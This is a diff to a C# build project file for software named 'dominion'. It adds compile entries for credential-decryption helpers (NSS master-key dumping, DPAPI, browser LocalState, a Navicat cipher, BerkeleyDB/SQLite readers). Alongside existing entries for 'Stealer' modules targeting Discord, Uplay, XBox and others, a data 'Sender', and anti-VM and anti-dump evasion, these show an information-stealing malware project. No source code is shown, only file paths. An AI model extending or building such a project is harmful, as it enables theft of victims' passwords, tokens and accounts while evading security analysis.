@@ -98,6 +98,26 @@
     <Compile Include="src\dominion\Dependencies\Data\Counter.cs" />
     <Compile Include="src\dominion\Dependencies\Data\InMemmoryZip.cs" />
     <Compile Include="src\dominion\Dependencies\Data\Paths.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\AesGcm.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\AesGcm256.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\Asn1Der.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\Asn1DerObject.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\Blowfish.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\CngDecryptor.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\DpApi.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\LocaEncryptor.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\LocalState.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\Navicat11Cipher.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\NSSDecryptor.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\NSSDumpMasterKey.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\RC4Crypt.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\TripleDes.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\Xor.cs" />
+    <Compile Include="src\dominion\Dependencies\Encryption\YuAuthenticatedData.cs" />
+    <Compile Include="src\dominion\Dependencies\Hashing\PBE.cs" />
+    <Compile Include="src\dominion\Dependencies\Hashing\PBKDF2.cs" />
+    <Compile Include="src\dominion\Dependencies\Sql\BerkeleyDB.cs" />
+    <Compile Include="src\dominion\Dependencies\Sql\SqLite.cs" />
     <Compile Include="src\dominion\Security\AntiDumpSectionScramble.cs" />
     <Compile Include="src\dominion\Security\AntiInjectionCheck.cs" />
     <Compile Include="src\dominion\Security\AntiVm.cs" />
@@ -164,6 +184,7 @@
     <Compile Include="src\dominion\Stealer\Games\Uplay.cs" />
     <Compile Include="src\dominion\Stealer\Games\XBox.cs" />
     <Compile Include="src\dominion\Stealer\General\Sender.cs" />
+    <Compile Include="src\dominion\Stealer\ITarget.cs" />
     <Compile Include="src\dominion\Stealer\Messangers\Discord.cs" />
     <Compile Include="src\dominion\Stealer\Messangers\Element.cs" />
     <Compile Include="src\dominion\Stealer\Messangers\Icq.cs" />
@@ -198,11 +219,7 @@
     <None Include="App.config" />
     <None Include="packages.config" />
   </ItemGroup>
-  <ItemGroup>
-    <Folder Include="src\dominion\Dependencies\Encryption\" />
-    <Folder Include="src\dominion\Dependencies\Hashing\" />
-    <Folder Include="src\dominion\Dependencies\Sql\" />
-  </ItemGroup>
+  <ItemGroup />
   <ItemGroup>
     <EmbeddedResource Include="Properties\Resources.resx">
       <Generator>ResXFileCodeGenerator</Generator>
